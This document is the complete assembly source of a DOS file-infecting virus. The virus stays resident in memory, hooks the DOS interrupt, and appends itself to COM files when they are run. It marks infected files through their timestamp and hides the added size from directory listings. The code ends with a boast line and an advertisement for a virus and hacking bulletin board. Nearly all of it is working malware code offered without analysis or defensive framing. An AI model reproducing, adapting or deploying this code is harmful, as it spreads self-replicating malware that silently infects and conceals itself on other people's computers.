virus segment public 'code'
	assume	cs:virus,ds:virus,es:virus
	org	0

VirusSize	equ	VirusEnd-$

Com:	call	Begin
	call	Label2

SavedCode:
	mov	ax,4c00h
	int	21h

        org     SavedCode+5h

Label2:	pop	si
	mov	di,100h
	push	di
	movsw
	movsw
	movsb
	ret

Begin:	push	ds
	push	es
	push	ax
	xor	ax,ax
	mov	ds,ax
	mov	ds,ds:[46ah]
	cmp	Signature,0ACDCh
	je	Exit
	mov	ah,4ah
	mov	bx,-1
	int	21h
        sub     bx,VirusParas1
	jb	Exit
	add	bh,10h
	mov	ah,4ah
	int	21h
	mov	ah,48h
        mov     bx,VirusParas2
	int	21h
	jb	Exit
	dec	ax
	mov	es,ax
	inc	ax
	mov	es:[1],ax
	mov	es,ax
	push	cs
	pop	ds
	call	Label1
Label1:	pop	si
	sub	si,offset Label1
	xor	di,di
	push	di
	mov	cx,VirusSize
	rep	movsb
	pop	ds
	mov	ax,ds:[84h]
	mov	word ptr es:OldInt21[0],ax
	mov	ax,ds:[86h]
	mov	word ptr es:OldInt21[2],ax
	mov	byte ptr ds:[467h],0eah
	mov	word ptr ds:[468h],offset NewInt21
	mov	ds:[46ah],es
	mov	word ptr ds:[84h],7
	mov	word ptr ds:[86h],46h
Exit:	pop	ax
	pop	ds
	pop	es
	ret

Header		db	0e9h
		dw	0
Signature	dw	0ACDCh

NewInt21:
	cmp	ah,4bh
        jne     on1
        jmp     exec
on1:    cmp     ah,4eh
        je      find
        cmp     ah,4fh
        je      find
        jmp     EOI

        Db ' As wolfs among sheep we have wandered '

Find:   call    interrupt                       ; call orginal interrupt
	jc	Ret1				; error ?
	pushf					; save registers
	push	ax
	push	bx
	push	es
	mov	ah,2fh
        call    interrupt
	mov	al,es:[bx+16h]			; get file-time (low byte)
	and	al,1fh				; seconds
	cmp	al,1fh				; 62 seconds ?
	jne	FileOk				; no, file not infected
	sub	word ptr es:[bx+1ah],VirusSize	; change file-size
	sbb	word ptr es:[bx+1ch],0
Time:	xor	byte ptr es:[bx+16h],10h	; adjust file-time
FileOk:	pop	es				; restore registers
	pop	bx
	pop	ax
	popf
ret1:   retf    2

Exec:	push	ax
	push	bx
	push	cx
	push	dx
	push	ds
	mov	ax,3d02h
	call	Interrupt
        jc      short Error
	push	cs
	pop	ds
	mov	bx,ax
	mov	ah,3fh
        mov     cx,5h
	mov	dx,offset SavedCode
	call	DOS
        cmp     word ptr cs:SavedCode,'ZM'
        je      short TheEnd
ComFile:cmp	word ptr cs:SavedCode[3],0ACDCh
        je      short TheEnd
	mov	al,02h
	call	Seek
	or	dx,dx
	cmp	ah,0f6h
        je      short Close
	sub	ax,5
	inc	ax
	inc	ax
	mov	word ptr ds:Header[1],ax
        mov     ax,5700h
        call    dos
        push    cx
        push    dx
	mov	ah,40h
	mov	cx,VirusSize
	xor	dx,dx
	call	DOS
	mov	al,00h
	call	Seek
	mov	ah,40h
	mov	cx,5
	mov	dx,offset Header
        call    dos
Close:  mov     ax,5701h
        pop     dx
        pop     cx
        or      cl,1fh
        call    dos
TheEnd: mov     ah,3eh
	call	Interrupt
Error:	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax

EOI:		db	0eah		; jmp	0:0
OldInt21	dd	026b1465h

Seek:	mov	ah,42h
	xor	cx,cx
	xor	dx,dx

DOS:	call	Interrupt
	jnc	Ok
	pop	ax
	jmp	Close

Interrupt:
	pushf
	call	cs:OldInt21
Ok:	ret

VirusEnd	equ	$

VirusParas1     equ (VirusSize+1fh)/10h+1000h
VirusParas2     equ (VirusSize+0fh)/10h

virus ends

end


;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
